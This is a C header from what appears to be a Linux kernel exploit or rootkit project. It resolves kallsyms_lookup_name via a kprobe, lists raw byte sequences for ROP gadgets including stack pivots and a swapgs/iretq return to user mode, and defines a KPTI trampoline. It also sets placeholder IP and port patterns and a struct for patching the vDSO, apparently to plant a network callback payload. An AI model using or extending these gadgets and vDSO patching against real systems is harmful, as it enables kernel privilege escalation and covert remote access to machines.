#ifndef __SPE_H
#define __SPE_H

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

/* KPTI Trampoline */
#define MOV_RDI_RSP  "\x48\x89\xe7\x00"
#define MOV_RAX_RSP  "\x48\x89\xe0\x00"

/* ROP gadgets */
enum ROP_gadgets
{
    POP_RDI_RET = 0,
    POP_RSI_RET,
    POP_RDX_RET,
    POP_RCX_RET,
    MOV_RDI_RAX_RET,
    PUSH_RSI_POP_RSP_RET,
    ADD_RSP_20H_RET,
    MOV_QWORD_PTR_RDI_RBP_RET,
    POP_RBP_RET,
    PUSH_QWORD_PTR_RBP_POP_RBP_RET,
    MOV_RSP_RBP_POP_RBP_RET,
    SWAPGS_IRETQ,
    PUSH_RSP_POP_RDX_PUSH_RSI_POP_RSP_RET,
    MOV_QWORD_PTR_RDI_RDX_RET,
    PUSH_QWORD_PTR_RDI_POP_RSP_RET,
    GADGETS_NUMS
};

#define BYTES_MAX 9
unsigned char gadgets_bytes[GADGETS_NUMS][BYTES_MAX] = {
    "\x5f\xc3", // pop rdi; ret
    "\x5e\xc3", // pop rsi; ret
    "\x5a\xc3", // pop rdx; ret
    "\x59\xc3", // pop rcx; ret
    "\x48\x89\xc7\xc3", // mov rdi, rax; ret
    "\x56\x5c\xc3", // push rsi; pop rsp; ret
    "\x48\x83\xc4\x20\xc3", // add rsp, 0x20; ret
    "\x48\x89\x2f\xc3", // mov qword ptr [rdi], rbp; ret
    "\x5d\xc3", // pop rbp; ret
    "\xff\x75\x00\x5d\xc3", // push qword ptr [rbp]; pop rbp; ret
    "\x48\x89\xec\x5d\xc3", // mov rsp, rbp; pop rbp; ret
    "\x0f\x01\xf8\x48\xcf", // swapgs; iretq
    "\x54\x5a\x56\x5c\xc3", // push rsp; pop rdx; push rsi; pop rsp; ret
    "\x48\x89\x17\xc3", // mov qword ptr [rdi], rdx; ret
    "\xff\x37\x5c\xc3"// push qword ptr [rdi]; pop rsp; ret
};

#define PATTERN_IP		"\xde\xc0\xad\xde"
#define PATTERN_PORT		"\x37\x13"
#define PATTERN_PROLOGUE	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

struct vdso_saved
{
    unsigned char *patched_code;
    int code_len;
};


/* Auxiliary functions */
static unsigned long search_mem(unsigned long base_addr, unsigned char *target, int len)
{
    unsigned int off;
    unsigned char *bytes = (unsigned char *)(base_addr);
    for (off = 0; off < 0x1000; off++){   
        int i;
        for (i = 0; i < len && bytes[off+i] == target[i]; i++){
            if (i == len-1){
                goto ret_addr;
            } 
        }
    }
    return 0;

ret_addr:    
    return base_addr+off;
}

#endif